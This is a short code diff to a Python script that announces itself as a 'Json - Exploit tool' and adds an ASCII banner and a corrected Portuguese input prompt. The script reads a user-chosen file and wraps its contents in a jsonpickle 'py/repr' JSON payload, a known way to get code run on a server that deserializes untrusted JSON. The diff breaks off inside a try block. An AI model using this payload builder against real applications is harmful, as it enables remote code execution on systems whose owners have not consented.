@@ -1,5 +1,16 @@
 import io
-code = open(input('  [+] Informe o caminho do payloade: '), 'r')
+print('''
+  __  __        ______ _   _                 
+ |  \/  |      |  ____| | | |                
+ | \  / |_ __  | |__  | |_| |__   __ _ _ __  
+ | |\/| | '__| |  __| | __| '_ \ / _` | '_ \ 
+ | |  | | |_   | |____| |_| | | | (_| | | | |
+ |_|  |_|_(_)  |______|\__|_| |_|\__,_|_| |_|
+
+  -> Json - Exploit tool python 3.5
+  -> By: Mr. Ethan
+''')
+code = open(input('  [+] Informe o caminho do payload: '), 'r')
 try:
   payload = '{"1": {"py/repr": code.read()}, "2": {"py/id": 67}}'
 except:
